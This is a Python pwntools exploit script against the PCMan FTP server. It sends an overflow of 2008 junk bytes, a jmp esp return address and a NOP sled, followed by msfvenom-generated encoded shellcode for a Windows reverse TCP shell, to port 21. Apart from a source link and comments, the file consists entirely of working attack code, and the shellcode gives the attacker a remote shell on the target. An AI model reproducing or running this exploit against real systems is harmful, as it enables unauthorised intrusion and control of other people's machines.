from pwn import *
from struct import pack

# https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z

junk = "A" * 2008
eip = pack("<I",0x762c902b) # jmp esp user32.dll
nops = "\x90" * 20

# msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=Port -e x86/shikata_ga_nai -b “\x00\x0d\x0a” -f python
buf =  b""
buf += b"\xda\xc5\xd9\x74\x24\xf4\xbd\x4a\x0a\x5c\x44\x5e\x2b"
buf += b"\xc9\xb1\x52\x31\x6e\x17\x03\x6e\x17\x83\x7e\x9e\xcf"
buf += b"\xd2\x7c\x76\x8d\x1d\x7c\x87\xf2\x94\x99\xb6\x32\xc2"
buf += b"\xea\xe9\x82\x80\xbe\x05\x68\xc4\x2a\x9d\x1c\xc1\x5d"
buf += b"\x16\xaa\x37\x50\xa7\x87\x04\xf3\x2b\xda\x58\xd3\x12"
buf += b"\x15\xad\x12\x52\x48\x5c\x46\x0b\x06\xf3\x76\x38\x52"
buf += b"\xc8\xfd\x72\x72\x48\xe2\xc3\x75\x79\xb5\x58\x2c\x59"
buf += b"\x34\x8d\x44\xd0\x2e\xd2\x61\xaa\xc5\x20\x1d\x2d\x0f"
buf += b"\x79\xde\x82\x6e\xb5\x2d\xda\xb7\x72\xce\xa9\xc1\x80"
buf += b"\x73\xaa\x16\xfa\xaf\x3f\x8c\x5c\x3b\xe7\x68\x5c\xe8"
buf += b"\x7e\xfb\x52\x45\xf4\xa3\x76\x58\xd9\xd8\x83\xd1\xdc"
buf += b"\x0e\x02\xa1\xfa\x8a\x4e\x71\x62\x8b\x2a\xd4\x9b\xcb"
buf += b"\x95\x89\x39\x80\x38\xdd\x30\xcb\x54\x12\x79\xf3\xa4"
buf += b"\x3c\x0a\x80\x96\xe3\xa0\x0e\x9b\x6c\x6f\xc9\xdc\x47"
buf += b"\xc7\x45\x23\x68\x38\x4c\xe0\x3c\x68\xe6\xc1\x3c\xe3"
buf += b"\xf6\xee\xe8\xa4\xa6\x40\x43\x05\x16\x21\x33\xed\x7c"
buf += b"\xae\x6c\x0d\x7f\x64\x05\xa4\x7a\xef\xea\x91\x94\xb7"
buf += b"\x82\xe3\x94\xb6\xc1\x6a\x72\xd2\x85\x3a\x2d\x4b\x3f"
buf += b"\x67\xa5\xea\xc0\xbd\xc0\x2d\x4a\x32\x35\xe3\xbb\x3f"
buf += b"\x25\x94\x4b\x0a\x17\x33\x53\xa0\x3f\xdf\xc6\x2f\xbf"
buf += b"\x96\xfa\xe7\xe8\xff\xcd\xf1\x7c\x12\x77\xa8\x62\xef"
buf += b"\xe1\x93\x26\x34\xd2\x1a\xa7\xb9\x6e\x39\xb7\x07\x6e"
buf += b"\x05\xe3\xd7\x39\xd3\x5d\x91\x93\x95\x37\x4b\x48\x7c"
buf += b"\xdf\x0a\xa2\xbf\x99\x12\xef\x49\x45\xa2\x46\x0c\x7a"
buf += b"\x0b\x0f\x98\x03\x71\xaf\x67\xde\x31\xcf\xad\x42\x7c"
buf += b"\x78\x68\x17\x3d\xe5\x8b\xc2\x02\x10\x0f\xe6\xfa\xe7"
buf += b"\x0f\x83\xff\xac\x97\x78\x72\xa1\x52\x7e\x21\xc2\x77"

c = remote("IP",21)
c.send(junk + eip + nops + buf)
c.close()
